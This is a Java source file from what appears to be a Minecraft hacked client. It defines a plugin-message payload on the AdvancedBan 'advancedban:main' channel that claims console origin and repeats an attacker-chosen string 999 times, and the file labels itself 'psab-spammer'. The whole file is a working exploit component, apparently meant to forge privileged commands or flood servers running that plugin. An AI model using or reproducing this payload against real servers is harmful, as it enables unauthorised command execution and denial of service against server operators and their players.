package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.util.Objects;

public record PubSubAdvancedban(String s) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, PubSubAdvancedban> CODEC = CustomPayload.codecOf(PubSubAdvancedban::write, PubSubAdvancedban::new);
    public static final CustomPayload.Id<PubSubAdvancedban> ID = new CustomPayload.Id<>(Identifier.of("advancedban", "main"));

    private PubSubAdvancedban(PacketByteBuf buf) {
        this(buf.readString());
    }

    private void write(PacketByteBuf buf) {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();
        out.writeUTF("CONSOLE");
        out.writeUTF(s.repeat(999));
        buf.writeBytes(out.toByteArray());
    }

    public CustomPayload.Id<PubSubAdvancedban> getId() {
        return ID;
    }
    @Override
    public boolean equals(Object obj) {
        return false;
    }

    @Override
    public int hashCode() {
        return 0;
    }

    @Override
    public String toString() {
        return "psab-spammer";
    }
}
